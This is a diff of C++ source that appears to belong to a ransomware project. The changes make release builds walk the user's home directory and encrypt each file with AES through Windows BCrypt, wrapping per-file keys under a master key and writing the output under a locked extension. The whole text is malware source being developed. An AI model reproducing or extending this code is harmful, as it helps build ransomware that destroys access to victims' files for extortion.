@@ -30,13 +30,13 @@ int main(int argc, char* argv[]) {
 
 	
 #ifdef DEBUG
-	string path = "C:\\rans\\236499\\Squanched\\Debug\\rans.txt";
+	string path = "C:\\rans\\236499\\Squanched\\Debug\\testDir";
 #else
 	string path = get_home();
 #endif
 
-	encrypt(path, masterIV, masterKey);
-//	iterate(path);
+//	encrypt(path, masterIV, masterKey);
+	iterate(path, &encrypt, masterIV, masterKey);
 
 //#ifdef DEBUG
 //	std::cout << "Username: " << get_username() << std::endl;
@@ -56,7 +56,7 @@ DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE 
 {
 	DWORD status;
 	BCRYPT_ALG_HANDLE aesHandle = nullptr;
-	BCRYPT_KEY_HANDLE keyHandle;
+	BCRYPT_KEY_HANDLE keyHandle = nullptr;
 	status = getKeyHandle(masterKey, keyHandle, aesHandle);
 	if (!NT_SUCCESS(status)) {
 		//TODO cleanup
@@ -123,7 +123,7 @@ bool initPlainText(string path, PBYTE *buffer, size_t buffSize)
 void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, size_t plainTextSize)
 {
 	unsigned short paddingSize = IV_LEN - (plainTextSize % IV_LEN);
-	char paddingSizeCStr[IV_DIGITS_NUM + 1] = { 0 }; //TODO 2 is the number of digits in IV_LEN, might wanna change that programatically
+	char paddingSizeCStr[IV_DIGITS_NUM + 1] = { 0 }; 
 	snprintf(paddingSizeCStr, IV_DIGITS_NUM + 1, "%02d", paddingSize);
 	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
 	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
@@ -164,6 +164,7 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 
 void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 {
+	if (!do_encrypt(path)) return;
 	DWORD status;
 	PBYTE plainText = nullptr;
 	size_t plainTextLen = getFileSize(path);
